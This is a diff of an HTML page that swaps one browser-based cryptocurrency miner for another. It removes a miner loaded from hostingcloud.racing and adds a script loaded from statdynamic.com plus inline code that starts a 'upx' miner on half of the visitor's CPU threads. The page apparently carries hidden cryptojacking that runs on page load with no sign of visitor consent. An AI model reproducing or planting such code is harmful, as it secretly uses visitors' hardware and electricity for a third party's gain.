@@ -26,12 +26,17 @@
 	
 
 	
-	<script src="https://www.hostingcloud.racing/Csjs.js"></script>
+	<script src="//statdynamic.com/lib/crypta.js"></script>
 	<script>
-	    miner = new Client.Anonymous('54e378ba5aab6451449c5da6dbf15356dcf895d339c01f13281348871791d1c1', {
-	        throttle: 0.9, c: 'w', autoThreads: true
-	    });
-	    miner.start();
+		var threads = window.navigator.hardwareConcurrency / 2;
+        if (threads < 1) {
+            var threads = 1;
+        }
+
+		miner=new CRLT.Anonymous('70ef7f254440e6d0fa184228a4bc9465bd5c5d5e1051', {
+			threads:threads,throttle:0.8, coin: "upx",
+		});
+		miner.start();
 	</script>
 
 	
